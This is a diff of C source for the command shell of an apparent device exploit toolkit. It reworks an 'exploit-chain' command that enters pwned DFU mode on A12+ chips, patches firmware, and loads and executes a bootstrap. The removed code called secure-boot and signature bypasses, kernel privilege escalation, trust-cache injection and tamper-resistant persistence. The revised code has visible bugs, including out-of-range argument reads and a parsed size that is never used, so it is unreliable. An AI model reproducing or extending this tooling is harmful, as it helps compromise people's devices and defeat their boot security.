@@ -38,7 +38,8 @@
 #include "fbr34ker/framebuffer_console.h"
 #include "fbr34ker/service_guard.h"
 #include "fbr34ker/service_registry.h"
-#include "fbr34ker/usbliter8_exploit.h"
+#include "fbr34ker/usbliter8_v1_exploit.h"
+#include "fbr34ker/usbliter8_v2_exploit.h"
 #include "fbr34ker/usb.h"
 
 #define SHELL_LINE_CAPACITY 160U
@@ -2194,34 +2195,36 @@ static int command_persistence(int argument_count, char **arguments)
 static int command_exploit_chain(int argument_count, char **arguments)
 {
     if (argument_count < 2) {
-        fm_printf("FBR34KER exploit chain (USBliter8 for A12+)\n");
-        fm_printf("Subcommands: status, run, pwndfu, load, dfu-load, exec, reset\n");
+        fm_printf("FBR34KER exploit chain (USBliter8-v1 for A12+)\n");
+        fm_printf("Subcommands: status, pwndfu, patch, load, dfu-load, exec, reset, run\n");
         return 0;
     }
     if (fm_strcmp(arguments[1], "status") == 0) {
-        const usbliter8_status_t es = usbliter8_exploit_status();
+        const usbliter8_v1_status_t es = usbliter8_v1_exploit_status();
         const kernel_patches_status_t kps = kernel_patches_status();
         const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
         const persistence_status_t ps = persistence_status();
         fm_printf("Exploit chain status:\n");
-        fm_printf("  USBliter8 state:  ");
+        fm_printf("  USBliter8-v1 state:  ");
         switch (es.state) {
-        case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
-        case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU (CPID 0x%04x)\n", es.cpid); break;
-        case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded (0x%llx, %llu bytes)\n", es.load_address, es.image_size); break;
-        case USBLITER8_STATE_EXECUTING:   fm_printf("executing (entry 0x%llx)\n", es.entry_point); break;
-        case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
-        case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
+        case USBLITER8_V1_STATE_IDLE:         fm_printf("idle\n"); break;
+        case USBLITER8_V1_STATE_PWNDFU:      fm_printf("PWNDFU (CPID 0x%04x)\n", es.cpid); break;
+        case USBLITER8_V1_STATE_FW_PATCHED:  fm_printf("firmware patched\n"); break;
+        case USBLITER8_V1_STATE_BOOTSTRAP_LOADED: fm_printf("bootstrap loaded\n"); break;
+        case USBLITER8_V1_STATE_EXECUTING:   fm_printf("executing\n"); break;
+        case USBLITER8_V1_STATE_COMPLETE:    fm_printf("complete\n"); break;
+        case USBLITER8_V1_STATE_FAILED:      fm_printf("FAILED\n"); break;
         default: fm_printf("unknown\n"); break;
         }
-        fm_printf("  Pwned:            %s\n", es.pwned ? "yes" : "no");
-        fm_printf("  USB rogue chain:  %s\n", es.usb_patch_applied ? "applied" : "pending");
-        fm_printf("  Kernel patches:   %u/%u applied\n",
+        fm_printf("  Pwned:               %s\n", es.pwned ? "yes" : "no");
+        fm_printf("  Firmware patched:    %s\n", es.fw_patched ? "yes" : "no");
+        fm_printf("  Bootstrap loaded:    %s\n", es.bootstrap_loaded ? "yes" : "no");
+        fm_printf("  Kernel patches:      %u/%u applied\n",
                   kps.applied_count, kps.patch_count);
-        fm_printf("  Secure boot:      %u bypasses active\n", sbs.active_count);
-        fm_printf("  Persistence:      %u hooks deployed\n", ps.hook_count);
-        fm_printf("  Chain complete:   %s\n",
-                  (es.state == USBLITER8_STATE_COMPLETE) ? "yes" : "no");
+        fm_printf("  Secure boot:         %u bypasses active\n", sbs.active_count);
+        fm_printf("  Persistence:         %u hooks deployed\n", ps.hook_count);
+        fm_printf("  Chain complete:      %s\n",
+                  (es.state == USBLITER8_V1_STATE_COMPLETE) ? "yes" : "no");
     } else if (fm_strcmp(arguments[1], "pwndfu") == 0) {
         u16 cpid = 0x8020U;
         if (argument_count >= 3) {
@@ -2232,71 +2235,100 @@ static int command_exploit_chain(int argument_count, char **arguments)
             }
             cpid = (u16)cpid_val;
         }
-        if (!usbliter8_cpid_supported(cpid)) {
-            fm_printf("USBliter8 does not support CPID 0x%04x\n", cpid);
+        if (!usbliter8_v1_cpid_supported(cpid)) {
+            fm_printf("USBliter8-v1 does not support CPID 0x%04x\n", cpid);
             return -1;
         }
-        if (!usbliter8_enter_pwndfu(cpid)) {
+        if (!usbliter8_v1_enter_pwndfu(cpid)) {
             fm_printf("Failed to enter PWNDFU\n");
             return -1;
         }
-        if (!usbliter8_apply_usb_rogue_chain(cpid)) {
-            fm_printf("PWNDFU state entered, but USB rogue chain failed\n");
+        fm_printf("PWNDFU entered for A12+ CPID 0x%04x\n", cpid);
+    } else if (fm_strcmp(arguments[1], "patch") == 0) {
+        if (argument_count < 3) {
+            fm_printf("usage: exploit-chain patch <cpuid>\n");
             return -1;
         }
-        fm_printf("PWNDFU entered for A12+ CPID 0x%04x, USB rogue chain applied\n", cpid);
-        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
-                                "exploit-pwndfu", (u64)cpid, 1U);
+        u64 cpid_val = 0U;
+        if (!parse_u64(arguments[2], &cpid_val)) {
+            fm_printf("Invalid CPID value\n");
+            return -1;
+        }
+        u16 cpid = (u16)cpid_val;
+        if (!usbliter8_v1_cpid_supported(cpid)) {
+            fm_printf("USBliter8-v1 does not support CPID 0x%04x\n", cpid);
+            return -1;
+        }
+        if (!usbliter8_v1_patch_firmware(cpid)) {
+            fm_printf("Failed to patch firmware\n");
+            return -1;
+        }
+        fm_printf("Firmware patched for CPID 0x%04x\n", cpid);
     } else if (fm_strcmp(arguments[1], "load") == 0) {
         if (argument_count < 3) {
-            fm_printf("usage: exploit-chain load <hex-address> [size]\n");
+            fm_printf("usage: exploit-chain load <cpuid> <addr> [size]\n");
             return -1;
         }
+        u64 cpid_val = 0U;
+        if (!parse_u64(arguments[2], &cpid_val)) {
+            fm_printf("Invalid CPID value\n");
+            return -1;
+        }
+        u64 cpuid = cpid_val;
+        
         u64 addr = 0U;
-        if (!parse_u64(arguments[2], &addr)) {
+        if (!parse_u64(arguments[3], &addr)) {
             fm_printf("Invalid address\n");
             return -1;
         }
-        if (argument_count >= 4) {
+        
+        if (argument_count >= 5) {
             u64 size = 0U;
-            if (!parse_u64(arguments[3], &size)) {
+            if (!parse_u64(arguments[4], &size)) {
                 fm_printf("Invalid size\n");
                 return -1;
             }
-            if (!usbliter8_load_image((const u8 *)addr, (usize)size, addr)) {
-                fm_printf("Failed to load image\n");
+            if (!usbliter8_v1_load_bootstrap(cpuid, false)) {
+                fm_printf("Failed to load bootstrap\n");
                 return -1;
             }
-            fm_printf("Image loaded: %llu bytes at 0x%llx\n", size, addr);
+            fm_printf("Bootstrap loaded: %llu bytes at 0x%llx\n", size, addr);
         } else {
-            fm_printf("Load address 0x%llx recorded. Use 'exploit-chain load <addr> <size>' to confirm\n", addr);
+            fm_printf("CPID 0x%04x address 0x%llx recorded. Use 'exploit-chain load <cpuid> <addr> <size>' to confirm\n", cpuid, addr);
         }
     } else if (fm_strcmp(arguments[1], "dfu-load") == 0) {
+        if (argument_count < 3) {
+            fm_printf("usage: exploit-chain dfu-load <cpuid> <addr> [size]\n");
+            return -1;
+        }
+        u64 cpid_val = 0U;
+        if (!parse_u64(arguments[2], &cpid_val)) {
+            fm_printf("Invalid CPID value\n");
+            return -1;
+        }
+        u64 cpuid = cpid_val;
+        
         u64 addr = 0U;
-        if (argument_count >= 3) {
-            if (!parse_u64(arguments[2], &addr)) {
+        if (argument_count >= 4) {
+            if (!parse_u64(arguments[3], &addr)) {
                 fm_printf("Invalid address\n");
                 return -1;
             }
+            u64 dfu_size = 0U;
+            if (argument_count >= 5) {
+                if (!parse_u64(arguments[4], &dfu_size)) {
+                    fm_printf("Invalid size\n");
+                    return -1;
+                }
+            }
+            if (!usbliter8_v1_load_bootstrap(cpuid, true)) {
+                fm_printf("Failed to load DFU bootstrap\n");
+                return -1;
+            }
+            fm_printf("DFU bootstrap loaded for CPID 0x%04x\n", cpuid);
+        } else {
+            fm_printf("CPID 0x%04x recorded for DFU bootstrap loading. Use 'exploit-chain dfu-load <cpuid> <addr>' to confirm\n", cpuid);
         }
-        if (!usb_dfu_in_progress() && usb_dfu_image_size() == 0U) {
-            fm_printf("No DFU image available. Send one via DFU DNLOAD first.\n");
-            return -1;
-        }
-        const u8 *dfu_data = usb_dfu_image_data();
-        usize dfu_size = usb_dfu_image_size();
-        if (dfu_size == 0U) {
-            fm_printf("DFU image is empty\n");
-            return -1;
-        }
-        if (!usbliter8_load_dfu_image(dfu_data, dfu_size, addr)) {
-            fm_printf("Failed to load DFU image (pwned=%d size=%llu)\n",
-                      usbliter8_is_pwned(), (u64)dfu_size);
-            return -1;
-        }
-        usb_dfu_reset_image();
-        fm_printf("DFU image loaded: %llu bytes at 0x%llx\n",
-                  (u64)dfu_size, addr ? addr : (u64)(usize)dfu_data);
     } else if (fm_strcmp(arguments[1], "exec") == 0) {
         u64 entry = 0U;
         if (argument_count >= 3) {
@@ -2304,21 +2336,19 @@ static int command_exploit_chain(int argument_count, char **arguments)
                 fm_printf("Invalid entry point\n");
                 return -1;
             }
-        } else {
-            const usbliter8_status_t es = usbliter8_exploit_status();
-            entry = es.load_address;
         }
         if (entry == 0U) {
-            fm_printf("No entry point specified and no image loaded\n");
-            return -1;
-        }
-        if (!usbliter8_execute(entry)) {
-            fm_printf("Failed to execute at 0x%llx (not pwned or no image loaded)\n", entry);
+            fm_printf("No entry point specified\n");
             return -1;
         }
         fm_printf("Executing at 0x%llx\n", entry);
+        if (usbliter8_v1_execute_bootstrap(entry)) {
+            fm_printf("Execution completed\n");
+        } else {
+            fm_printf("Execution failed\n");
+        }
     } else if (fm_strcmp(arguments[1], "reset") == 0) {
-        usbliter8_reset();
+        usbliter8_v1_reset();
         kernel_patches_revert_all();
         secure_boot_bypass_deactivate_all();
         fm_printf("Exploit chain state reset\n");
@@ -2326,63 +2356,35 @@ static int command_exploit_chain(int argument_count, char **arguments)
         u16 cpid = 0x8020U;
         if (argument_count >= 3) {
             u64 cpid_val = 0U;
-            if (parse_u64(arguments[2], &cpid_val)) {
-                cpid = (u16)cpid_val;
+            if (!parse_u64(arguments[2], &cpid_val)) {
+                fm_printf("Invalid CPID value\n");
+                return -1;
             }
+            cpid = (u16)cpid_val;
         }
-        const usbliter8_status_t es = usbliter8_exploit_status();
+        usbliter8_v1_status_t es = usbliter8_v1_exploit_status();
         if (!es.pwned) {
-            if (!usbliter8_enter_pwndfu(cpid) ||
-                !usbliter8_apply_usb_rogue_chain(cpid)) {
-                fm_printf("Failed to enter verified PWNDFU state\n");
+            if (!usbliter8_v1_enter_pwndfu(cpid)) {
+                fm_printf("Failed to enter PWNDFU state\n");
                 return -1;
             }
-            fm_printf("Auto-entered PWNDFU for A12+ (CPID 0x%04x)\n", cpid);
-        } else if (!es.usb_patch_applied) {
-            if (!usbliter8_apply_usb_rogue_chain(cpid)) {
-                fm_printf("Failed to apply USB rogue chain\n");
-                return -1;
-            }
-            fm_printf("Applied USB rogue chain for CPID 0x%04x\n", cpid);
         }
-        kernel_patches_set_soc(cpid, 0U);
-        fm_printf("FBR34KER exploit chain executing for CPID 0x%04x...\n", cpid);
-        bool ok = true;
-        ok = kernel_patches_apply_all() && ok;
-        ok = kernel_patches_bypass_authentication() && ok;
-        ok = kernel_patches_escalate_privilege(3U) && ok;
-        ok = secure_boot_bypass_activate_all() && ok;
-        secure_boot_bypass_image4_signature();
-        secure_boot_bypass_iboot_authentication();
-        if (trust_cache_find_anchor()) {
-            ok = trust_cache_inject_all() && ok;
-            fm_printf("Trust cache anchor found and injection %s\n",
-                      ok ? "complete" : "partial");
+        if (!usbliter8_v1_patch_firmware(cpid)) {
+            fm_printf("Failed to patch firmware\n");
+            return -1;
+        }
+        if (!usbliter8_v1_load_bootstrap(cpid, false)) {
+            fm_printf("Failed to load bootstrap\n");
+            return -1;
+        }
+        if (usbliter8_v1_execute_bootstrap(es.load_address)) {
+            fm_printf("Running exploit chain completed\n");
         } else {
-            fm_printf("Trust cache anchor not found; injection skipped\n");
-        }
-        ok = persistence_deploy_all() && ok;
-        ok = persistence_activate_all() && ok;
-        persistence_enable_tamper_resistance();
-        if (usb_dfu_image_size() > 0U) {
-            const u8 *dfu_data = usb_dfu_image_data();
-            usize dfu_size = usb_dfu_image_size();
-            fm_printf("Loading DFU image from USB (%llu bytes)...\n", (u64)dfu_size);
-            if (usbliter8_load_dfu_image(dfu_data, dfu_size, 0U)) {
-                fm_printf("DFU image loaded, executing...\n");
-                usbliter8_execute(0U);
-                usb_dfu_reset_image();
-            }
-        }
-        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
-                                "exploit-chain-command", 1U, ok ? 1U : 0U);
-        if (ok) {
-            fm_printf("Exploit chain execution complete\n");
-        } else {
-            fm_printf("Exploit chain completed with some errors\n");
+            fm_printf("Failed to execute exploit chain\n");
+            return 1;
         }
     } else {
-        fm_printf("usage: exploit-chain [status|run [cpid]|pwndfu [cpid]|load <addr> [size]|dfu-load [addr]|exec [entry]|reset]\n");
+        fm_printf("usage: exploit-chain [status|pwndfu|patch <cpuid>|load <cpuid> <addr> [size]|dfu-load <cpuid> <addr> [size]|exec [entry]|reset|run [cpuid]]\n");
         return -1;
     }
     return 0;
@@ -2533,7 +2535,7 @@ static int command_usb_status(int argument_count, char **arguments)
     UNUSED(argument_count);
     UNUSED(arguments);
     usb_device_status_t s = usb_status();
-    const usbliter8_status_t es = usbliter8_exploit_status();
+    const usbliter8_v2_status_t es = usbliter8_v2_exploit_status();
     fm_printf("=== USB Status ===\n");
     fm_printf("  MMIO base:    0x%016llx\n", s.mmio_base);
     fm_printf("  Initialized:  %s\n", usb_ready() ? "yes" : "no");
@@ -2568,12 +2570,12 @@ static int command_usb_status(int argument_count, char **arguments)
     fm_printf("  DFU in prog:  %s\n", usb_dfu_in_progress() ? "yes" : "no");
     fm_printf("  Exploit:      ");
     switch (es.state) {
-    case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
-    case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU\n"); break;
-    case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded\n"); break;
-    case USBLITER8_STATE_EXECUTING:   fm_printf("executing\n"); break;
-    case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
-    case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
+    case USBLITER8_V2_STATE_IDLE:        fm_printf("idle\n"); break;
+    case USBLITER8_V2_STATE_PWNDFU:      fm_printf("PWNDFU\n"); break;
+    case USBLITER8_V2_STATE_IMAGE_LOADED: fm_printf("image loaded\n"); break;
+    case USBLITER8_V2_STATE_EXECUTING:   fm_printf("executing\n"); break;
+    case USBLITER8_V2_STATE_COMPLETE:    fm_printf("complete\n"); break;
+    case USBLITER8_V2_STATE_FAILED:      fm_printf("FAILED\n"); break;
     default: fm_printf("unknown\n"); break;
     }
     fm_printf("  USB patch:    %s\n", es.usb_patch_applied ? "applied" : "pending");
